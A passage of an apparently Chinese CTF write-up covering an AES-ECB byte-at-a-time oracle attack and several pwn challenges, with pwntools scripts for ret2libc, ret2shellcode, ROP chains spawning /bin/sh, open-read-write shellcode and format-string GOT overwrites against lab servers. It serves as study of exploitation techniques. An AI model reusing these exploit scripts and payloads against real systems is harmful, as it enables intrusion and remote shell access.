class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(input1,input2)</span>:</span></span><br><span class="line">    passw[input1]=passw[input1][input2:input2+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">Id just like to interject for a moment. What youre referring to as Linux is in fact GNU Linux o</span><br><span class="line">Hello, my name is OSKI    and welcome to--berkeley we hope you have a   wonderful  stay........</span><br><span class="line">No more of such vague formulae as The Right To Work  or To Each The Whole Result of his Labour.</span><br><span class="line">     What we proclaim   is The Right To Well-Being  Well-Being for All! - The Conquest of Bread</span><br><span class="line">Do you all think that this channel has been breached? Nah our leland univ crypto guy is top of</span><br><span class="line">In this mode  the initial vector IV is repeatedly encrypted to obtain a set of values Zi as fol</span><br><span class="line">Im sorry Mario, but CONTOSO PRINCESS is in a different forest! - SwiftOnSecurity Tay 2015-03-29</span><br><span class="line">At one point I was debating whether or not to add the UCBMFKLT copypasta on here but I have too</span><br><span class="line">much self respect. Making random lorem ipsum is actually a lot harder than one would think tbh</span><br><span class="line">ACTF.womenfenshouba,woranggeikira.</span><br><span class="line">'''</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="lovely-aes1"><a class="header-anchor" href="#lovely-aes1">¶</a>Lovely AES1</h5>
+<p>我们每次可以求 a+input+b+secret 的 aes 值，而题目的 aes 是 16 个一块加密的，块与块之间不影响。于是可以构造 input 使得密文中的某一块是每次仅有一位未知的 secret 位加上已知明文组成的，于是就可以暴力。至于暴力的方法则是构造 input 使得 已知明文+暴力枚举位 是单独的一块。<br>
+最多跑 19*256 次，很不错。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">sh=remote(<span class="string">"10.214.24.188"</span>,<span class="number">13370</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"><span class="comment">#sh=process('./challenge1.py')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sec=<span class="string">''</span></span><br><span class="line">a=<span class="string">'Your name:'</span></span><br><span class="line">c=<span class="string">'Your secret:'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(str)</span>:</span></span><br><span class="line">    pad=(<span class="number">16</span>-len(a))*<span class="string">'a'</span>+str</span><br><span class="line">    sh.sendline(<span class="string">'Get secret'</span>.encode(<span class="string">'hex'</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Your name: "</span>)</span><br><span class="line">    sh.sendline(pad.encode(<span class="string">'hex'</span>))</span><br><span class="line">    tret=sh.recv()</span><br><span class="line">    tret=tret[:len(tret)].decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="comment">#tret[16:16*2].encode('hex')</span></span><br><span class="line">    <span class="keyword">return</span> tret[<span class="number">16</span>:<span class="number">16</span>*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    b=(<span class="number">48</span>-len(a+c)-i)*<span class="string">'0'</span></span><br><span class="line">    sh.sendline(<span class="string">'Get secret'</span>.encode(<span class="string">'hex'</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">"Your name: "</span>)</span><br><span class="line">    sh.sendline(b.encode(<span class="string">'hex'</span>))</span><br><span class="line">    ret=sh.recv()</span><br><span class="line">    ret=ret[:len(ret)].decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> ret[<span class="number">16</span>*<span class="number">2</span>:<span class="number">16</span>*<span class="number">3</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> enc((a+b+c+sec+chr(j))[<span class="number">16</span>*<span class="number">2</span>:<span class="number">16</span>*<span class="number">3</span>])==ret[<span class="number">16</span>*<span class="number">2</span>:<span class="number">16</span>*<span class="number">3</span>]:</span><br><span class="line">            sec+=chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sec</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'Get flag'</span>.encode(<span class="string">'hex'</span>))</span><br><span class="line">sh.sendline(sec.encode(<span class="string">'hex'</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="pwnable"><a class="header-anchor" href="#pwnable">¶</a>Pwnable</h2>
+<h5 id="baby-bof"><a class="header-anchor" href="#baby-bof">¶</a>baby bof</h5>
+<p>字符串溢出。<br>
+用 ida 打开计算 offset 得到 padding 长度<br>
+注意小端序</p>
+<hr>
+<h5 id="baby-ret2lib"><a class="header-anchor" href="#baby-ret2lib">¶</a>baby ret2lib</h5>
+<p>根据题给 so 文件求 offset<br>
+题目程序给你一次读地址的机会，读 got 表中的数据即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset puts //134520860</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0005F140                 public puts ; weak</span><br><span class="line"></span><br><span class="line">.text:0003A940                 public system ; weak</span><br><span class="line"></span><br><span class="line">0015902B			'/bin/sh'</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">11523</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">'134520860'</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts=<span class="number">0xf7e52140</span> <span class="comment">#from remote</span></span><br><span class="line"></span><br><span class="line">binsh_addr = puts-<span class="number">0x0005F140</span>+<span class="number">0x0015902B</span></span><br><span class="line">system_plt = puts-<span class="number">0x0005F140</span>+<span class="number">0x0003A940</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">0x3c</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="baby-ret2sc"><a class="header-anchor" href="#baby-ret2sc">¶</a>baby ret2sc</h5>
+<p>我以为是 ret2systemcall 结果找不到 gadgets<br>
+checksec 发现 NX 未开启，输入又是输入到全局变量里的<br>
+机智的我把 gadgets 输进去然后用 ret2systemcall 操作做<br>
+后来才意识到是 ret2shellcode ，没必要兜圈子。<br>
+罢了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span><br><span class="line">0x0015902b /bin/sh</span><br><span class="line">0x0003A940</span><br><span class="line"></span><br><span class="line">.bss:0804A060 pop     eax</span><br><span class="line">.bss:0804A061 retn</span><br><span class="line">.bss:0804A062 ; ---------------------------------------------------------------------------</span><br><span class="line">.bss:0804A062 pop     edx</span><br><span class="line">.bss:0804A063 pop     ecx</span><br><span class="line">.bss:0804A064 pop     ebx</span><br><span class="line">.bss:0804A065 retn</span><br><span class="line">.bss:0804A066 ; ---------------------------------------------------------------------------</span><br><span class="line">.bss:0804A066 int     80h                             ; LINUX -</span><br><span class="line">.bss:0804A066 ; ---------------------------------------------------------------------------</span><br><span class="line">.bss:0804A068 db    0</span><br><span class="line"></span><br><span class="line">.bss:0804A060 name [50]</span><br><span class="line"></span><br><span class="line">/bin/sh		// 0x0804A060</span><br><span class="line"></span><br><span class="line">\x58		// pop eax  0x0804A068</span><br><span class="line">\xc3		// ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\x5a		// pop edx  0x0804A06A</span><br><span class="line">\x59		// pop ecx  </span><br><span class="line">\x5b		// pop ebx  </span><br><span class="line">\xc3		// ret</span><br><span class="line"></span><br><span class="line">\xcd\x80	// int 80h  0x0804A06E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------</span><br><span class="line">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name=<span class="string">'/bin/sh\0\x58\xc3\x5a\x59\x5b\xc3\xcd\x80'</span>+<span class="string">'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'</span></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">11782</span>)</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x0804A068</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0804A06A</span></span><br><span class="line">int_0x80 = <span class="number">0x0804A06E</span></span><br><span class="line">binsh = <span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span> * (<span class="number">0x4</span>+<span class="number">0x14</span>+<span class="number">8</span>), pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="baby-rop"><a class="header-anchor" href="#baby-rop">¶</a>baby rop</h5>
+<p>静态链接，ROPgadget --ropchain 一梭子<br>
+才怪，要修改一下，太长了，还要截断<br>
+最后的结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">main_addr=<span class="number">0x08048E24</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">11863</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./baby_rop')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054250</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += p32(main_addr)</span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">32</span>+p</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e851</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808f720</span>) <span class="comment"># mov eax, 7 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0808F6A0</span>) <span class="comment"># add eax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b27f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080493e1</span>) <span class="comment"># int 0x80</span></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">28</span>+p</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="orw"><a class="header-anchor" href="#orw">¶</a>orw</h5>
+<p>标准 orw<br>
+找个别人的 payload 改改都能过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#('SuperLo0000000000000ngFlagggggggggggggggggggggggName.txt'[::-1]).encode('hex')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"xor ecx,ecx;push ecx;"</span></span><br><span class="line">shellcode = shellcode + <span class="string">"push 0x7478742e;push 0x656d614e;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676761;push 0x6c46676e;push 0x30303030;push 0x30303030;push 0x30303030;push 0x306f4c72;push 0x65707553;;"</span></span><br><span class="line">shellcode = shellcode + <span class="string">"mov ebx,esp;xor edx,edx;mov eax,0x5;int 0x80;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80"</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">13647</span>)</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./orw')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>pwn 库好文明</p>
+<hr>
+<h5 id="fsb-easy"><a class="header-anchor" href="#fsb-easy">¶</a>fsb easy</h5>
+<p>64 位的格式化字符串漏洞<br>
+需要一次性写入 &amp; 写入地址需放最后防止被截断<br>
+<code>payload='a%4196552c%8$lln\x18\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</code></p>
+<hr>
+<h5 id="fsb-inf"><a class="header-anchor" href="#fsb-inf">¶</a>fsb inf</h5>
+<p>64 位的格式化字符串漏洞<br>
+有很多次循环<br>
+我是先读取got表，再根据末三位地址搜索得到服务器所用 libc 库<br>
+有了 libc 库就能得到别的函数的偏移，以及 onegadget 一键获取 shell<br>
+但是 gadget_addr 太大了，一次写不完<br>
+思路：先 一字节一字节 把 exit 的 got 表修改到 gadget_addr ，最后一次一步将 printf_got 改成 call exit 的地址，实现跳转</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">fsb=ELF(<span class="string">'./fsb_inf'</span>)</span><br><span class="line"></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(5)</span></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">17526</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./fsb_inf')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got = fsb.got[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = fsb.got[<span class="string">'printf'</span>]</span><br><span class="line">ext_got = fsb.got[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line">p1=<span class="string">'AAAA%7$s'</span>+p64(puts_got)</span><br><span class="line">sh.sendline(p1)</span><br><span class="line">ret1=sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">ret1=ret1[<span class="number">4</span>:ret1.find(<span class="string">'\n'</span>)-<span class="number">3</span>]</span><br><span class="line">puts_addr=u64(ret1+<span class="string">'\0'</span>*(<span class="number">8</span>-len(ret1)))</span><br><span class="line"><span class="keyword">print</span> puts_addr</span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x06f690</span> <span class="comment">#https://libc.blukat.me/?q=puts%3A690&amp;l=libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">gadget_offset = <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_offset = 0x071910</span></span><br><span class="line"><span class="comment">#gadget_offset = 0x4484f</span></span><br><span class="line"></span><br><span class="line">gadget_addr = puts_addr - puts_offset + gadget_offset</span><br><span class="line"></span><br><span class="line">psize=gadget_addr&amp;<span class="number">0xffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    payload =<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span>(ord(p64(gadget_addr)[i])!=<span class="number">0</span>):</span><br><span class="line">        payload =<span class="string">'%'</span>+str(ord(p64(gadget_addr)[i]))+<span class="string">'c'</span></span><br><span class="line">    payload +=<span class="string">'%9$hhn'</span></span><br><span class="line">    payload +=<span class="string">'A'</span>*(<span class="number">24</span>-len(payload))</span><br><span class="line">    payload += p64(ext_got+i)</span><br><span class="line">    print(payload)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">'%999999c%999999c%999999c%999999c%196084c'</span></span><br><span class="line">payload +=<span class="string">'%13$lln'</span></span><br><span class="line">payload +=<span class="string">'A'</span>*(<span class="number">7</span>*<span class="number">8</span>-len(payload))</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h5 id="fsb-one"><a class="header-anchor" href="#fsb-one">¶</a>fsb one</h5>
+<p>和 fsb inf 几乎完全一致，只不过一开始就要把 puts 的 got 指向<br>
+然后这回获取原函数地址我是通过 setvbuf<br>
+其他没了，注意 puts 没有输出了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">fsb=ELF(<span class="string">'./fsb_one'</span>)</span><br><span class="line"></span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(5)</span></span><br><span class="line"><span class="comment">#sh=remote("10.214.10.18",18422)</span></span><br><span class="line"><span class="comment">#sh.sendline(auth)</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">'./fsb_one'</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_got = fsb.got[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = fsb.got[<span class="string">'printf'</span>]</span><br><span class="line">setvbuf_got = fsb.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">ext_got = fsb.got[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">'%999999c%999999c%999999c%999999c%196748‬c'</span></span><br><span class="line">payload +=<span class="string">'%13$lln'</span></span><br><span class="line">payload +=<span class="string">'A'</span>*(<span 